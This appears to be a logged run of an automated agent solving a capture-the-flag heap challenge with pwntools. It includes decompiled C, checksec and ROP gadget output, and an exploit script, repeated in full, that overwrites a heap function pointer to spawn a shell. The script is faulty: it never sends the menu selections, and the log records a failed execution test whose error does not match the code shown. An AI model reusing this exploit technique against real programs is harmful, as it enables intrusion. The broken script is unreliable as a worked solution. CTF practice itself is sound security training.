@@ -1,0 +1,253 @@
+{'documents': [],
+ 'error': 'yes',
+ 'generation': code(prefix="To solve this challenge, we need to exploit the heap-related vulnerabilities in the binary. The key vulnerability here is the use of `gets` in the `edit_meme` function, which allows us to overwrite the function pointer stored in the meme structure. We will use Pwntools to craft an exploit that overwrites the function pointer with the address of `EZ_WIN`, a function that spawns a shell. Here's how you can do it:", imports='from pwn import *', code="context.binary = './pwn/heap/heap-2/heap2'\nelf = context.binary\n\n# Start a process or connect to remote if necessary\np = process(elf.path)\n\n# Addresses\nez_win_addr = elf.symbols['EZ_WIN']\n\n# Menu choices\nNEW_MEME = 1\nEDIT_MEME = 2\nPRINT_MEME = 3\nEXIT = 4\n\n# Create a new meme and get its index\ndef create_meme(size, content):\n    p.sendlineafter(b'Enter meme size: ', str(size).encode())\n    p.sendlineafter(b'Enter meme content: ', content)\n\n# Edit an existing meme\ndef edit_meme(index, content):\n    p.sendlineafter(b'Index: ', str(index).encode())\n    p.sendline(content)\n\n# Print a meme\ndef print_meme(index):\n    p.sendlineafter(b'Index: ', str(index).encode())\n\n# Create a new meme\ncreate_meme(0x10, b'A' * 0x10)\n\n# Overwrite the function pointer with the address of EZ_WIN\nedit_meme(0, b'B' * 0x10 + p64(ez_win_addr))\n\n# Trigger the function pointer call\nprint_meme(0)\n\n# Switch to interactive mode\np.interactive()"),
+ 'info': 'Challenge is a ELF 64-bit LSB executable file and the file path is '
+         '"./pwn/heap/heap-2/heap2".\n'
+         '1.Here is the key function for exploit in the C file decompiled from '
+         'heap2:\n'
+         'int __fastcall main(int argc, const char **argv, const char **envp)\n'
+         '{\n'
+         '  unsigned int v3; // eax\n'
+         '\n'
+         '  init(argc, argv, envp);\n'
+         '  while ( 1 )\n'
+         '  {\n'
+         '    while ( 1 )\n'
+         '    {\n'
+         '      while ( 1 )\n'
+         '      {\n'
+         '        print_menu();\n'
+         '        v3 = read_int();\n'
+         '        if ( v3 != 3 )\n'
+         '          break;\n'
+         '        print_meme();\n'
+         '      }\n'
+         '      if ( v3 <= 3 )\n'
+         '        break;\n'
+         '      if ( v3 == 4 )\n'
+         '      {\n'
+         '        puts("Bye bye!");\n'
+         '        exit(0);\n'
+         '      }\n'
+         'LABEL_10:\n'
+         '      puts("Invalid choice!");\n'
+         '    }\n'
+         '    if ( v3 == 1 )\n'
+         '    {\n'
+         '      new_meme();\n'
+         '    }\n'
+         '    else\n'
+         '    {\n'
+         '      if ( v3 != 2 )\n'
+         '        goto LABEL_10;\n'
+         '      edit_meme();\n'
+         '    }\n'
+         '  }\n'
+         '}\n'
+         '\n'
+         'unsigned __int64 init()\n'
+         '{\n'
+         '  unsigned __int64 v1; // [rsp+8h] [rbp-10h]\n'
+         '\n'
+         '  v1 = __readfsqword(0x28u);\n'
+         '  setvbuf(_bss_start, 0LL, 2, 0LL);\n'
+         '  memes = (__int64)malloc(0x40uLL);\n'
+         '  return __readfsqword(0x28u) ^ v1;\n'
+         '}\n'
+         '\n'
+         'int new_meme()\n'
+         '{\n'
+         '  unsigned int v0; // eax\n'
+         '  unsigned int v1; // r12d\n'
+         '  __int64 v2; // rbx\n'
+         '  _QWORD *v3; // rbp\n'
+         '  _QWORD *v4; // rax\n'
+         '\n'
+         '  __printf_chk(1LL, "Enter meme size: ");\n'
+         '  v0 = read_int();\n'
+         '  if ( v0 > 0x200 )\n'
+         '  {\n'
+         '    puts("Please, noone wants to read the entire bee movie '
+         'script");\n'
+         '    exit(-1);\n'
+         '  }\n'
+         '  v1 = v0;\n'
+         '  v2 = 0LL;\n'
+         '  while ( 1 )\n'
+         '  {\n'
+         '    v3 = (_QWORD *)(memes + v2);\n'
+         '    if ( !*(_QWORD *)(memes + v2) )\n'
+         '      break;\n'
+         '    v2 += 8LL;\n'
+         '    if ( v2 == 64 )\n'
+         '    {\n'
+         '      puts("No more memes for you!");\n'
+         '      exit(-1);\n'
+         '    }\n'
+         '  }\n'
+         '  v4 = malloc(8uLL);\n'
+         '  *v3 = v4;\n'
+         '  *v4 = my_print;\n'
+         '  v4[1] = malloc(v1);\n'
+         '  __printf_chk(1LL, "Enter meme content: ");\n'
+         '  fgets(*(char **)(*(_QWORD *)(memes + v2) + 8LL), v1, stdin);\n'
+         '  return puts("Done!");\n'
+         '}\n'
+         '\n'
+         'int edit_meme()\n'
+         '{\n'
+         '  __int64 v0; // rbx\n'
+         '\n'
+         '  __printf_chk(1LL, "Index: ");\n'
+         '  v0 = (unsigned int)read_int();\n'
+         '  if ( !*(_QWORD *)(memes + 8 * v0) )\n'
+         '    return puts("There\\\'s no meme there!");\n'
+         '  __printf_chk(1LL, "Enter meme content: ");\n'
+         '  gets(*(_QWORD *)(*(_QWORD *)(memes + 8 * v0) + 8LL));\n'
+         '  return puts("Done!");\n'
+         '}\n'
+         '\n'
+         'int print_meme()\n'
+         '{\n'
+         '  __int64 v0; // rax\n'
+         '\n'
+         '  __printf_chk(1LL, "Index: ");\n'
+         '  v0 = *(_QWORD *)(memes + 8LL * (unsigned int)read_int());\n'
+         '  if ( v0 )\n'
+         '    return (*(__int64 (__fastcall **)(_QWORD))v0)(*(_QWORD *)(v0 + '
+         '8));\n'
+         '  else\n'
+         '    return puts("There\\\'s no meme there!");\n'
+         '}\n'
+         '\n'
+         'void __noreturn EZ_WIN()\n'
+         '{\n'
+         '  puts("EAAAAAAAAAAAASYYYYYYYYYYYYY");\n'
+         '  system("/bin/sh");\n'
+         '  exit(0);\n'
+         '}\n'
+         '\n'
+         "2.Here is the file security infomation identified by 'checksec' "
+         'command:\n'
+         '{"relro": "full", "canary": "yes", "nx": "yes", "pie": "no", '
+         '"rpath": "no", "runpath": "no", "symbols": "yes", "fortify_source": '
+         '"yes", "fortified": "1", "fortify-able": "3"}\n'
+         '\n'
+         '3.Here is some printable strings in the data sections of heap2:\n'
+         '/bin/sh\n'
+         '\n'
+         '4.We use ROPgadget to search gadgets on heap2:\n'
+         'Gadgets information\n'
+         '============================================================\n'
+         '0x00000000004017ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n'
+         '0x00000000004017ae : pop r13 ; pop r14 ; pop r15 ; ret\n'
+         '0x00000000004017b0 : pop r14 ; pop r15 ; ret\n'
+         '0x00000000004017b2 : pop r15 ; ret\n'
+         '0x00000000004017ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 '
+         '; ret\n'
+         '0x00000000004017af : pop rbp ; pop r14 ; pop r15 ; ret\n'
+         '0x00000000004012dd : pop rbp ; ret\n'
+         '0x00000000004017b3 : pop rdi ; ret\n'
+         '0x00000000004017b1 : pop rsi ; pop r15 ; ret\n'
+         '0x00000000004017ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n'
+         '0x000000000040101a : ret\n'
+         '0x00000000004016fc : ret 0x8548\n'
+         '0x00000000004014a9 : ret 0xb\n'
+         '\n'
+         'Unique gadgets found: 13\n'
+         '\n',
+ 'iterations': 1,
+ 'messages': [('user', 'How do I use pwntool to solve this challange?'),
+              ('assistant',
+               'To solve this challenge, we need to exploit the heap-related '
+               'vulnerabilities in the binary. The key vulnerability here is '
+               'the use of `gets` in the `edit_meme` function, which allows us '
+               'to overwrite the function pointer stored in the meme '
+               'structure. We will use Pwntools to craft an exploit that '
+               'overwrites the function pointer with the address of `EZ_WIN`, '
+               "a function that spawns a shell. Here's how you can do it: \n"
+               ' Imports: from pwn import * \n'
+               " Code: context.binary = './pwn/heap/heap-2/heap2'\n"
+               'elf = context.binary\n'
+               '\n'
+               '# Start a process or connect to remote if necessary\n'
+               'p = process(elf.path)\n'
+               '\n'
+               '# Addresses\n'
+               "ez_win_addr = elf.symbols['EZ_WIN']\n"
+               '\n'
+               '# Menu choices\n'
+               'NEW_MEME = 1\n'
+               'EDIT_MEME = 2\n'
+               'PRINT_MEME = 3\n'
+               'EXIT = 4\n'
+               '\n'
+               '# Create a new meme and get its index\n'
+               'def create_meme(size, content):\n'
+               "    p.sendlineafter(b'Enter meme size: ', str(size).encode())\n"
+               "    p.sendlineafter(b'Enter meme content: ', content)\n"
+               '\n'
+               '# Edit an existing meme\n'
+               'def edit_meme(index, content):\n'
+               "    p.sendlineafter(b'Index: ', str(index).encode())\n"
+               '    p.sendline(content)\n'
+               '\n'
+               '# Print a meme\n'
+               'def print_meme(index):\n'
+               "    p.sendlineafter(b'Index: ', str(index).encode())\n"
+               '\n'
+               '# Create a new meme\n'
+               "create_meme(0x10, b'A' * 0x10)\n"
+               '\n'
+               '# Overwrite the function pointer with the address of EZ_WIN\n'
+               "edit_meme(0, b'B' * 0x10 + p64(ez_win_addr))\n"
+               '\n'
+               '# Trigger the function pointer call\n'
+               'print_meme(0)\n'
+               '\n'
+               '# Switch to interactive mode\n'
+               'p.interactive()'),
+              ('user',
+               "Your solution failed the code execution test: 'str' object has "
+               "no attribute 'decode'")]}
+from pwn import *
+context.binary = './pwn/heap/heap-2/heap2'
+elf = context.binary
+
+# Start a process or connect to remote if necessary
+p = process(elf.path)
+
+# Addresses
+ez_win_addr = elf.symbols['EZ_WIN']
+
+# Menu choices
+NEW_MEME = 1
+EDIT_MEME = 2
+PRINT_MEME = 3
+EXIT = 4
+
+# Create a new meme and get its index
+def create_meme(size, content):
+    p.sendlineafter(b'Enter meme size: ', str(size).encode())
+    p.sendlineafter(b'Enter meme content: ', content)
+
+# Edit an existing meme
+def edit_meme(index, content):
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.sendline(content)
+
+# Print a meme
+def print_meme(index):
+    p.sendlineafter(b'Index: ', str(index).encode())
+
+# Create a new meme
+create_meme(0x10, b'A' * 0x10)
+
+# Overwrite the function pointer with the address of EZ_WIN
+edit_meme(0, b'B' * 0x10 + p64(ez_win_addr))
+
+# Trigger the function pointer call
+print_meme(0)
+
+# Switch to interactive mode
+p.interactive()
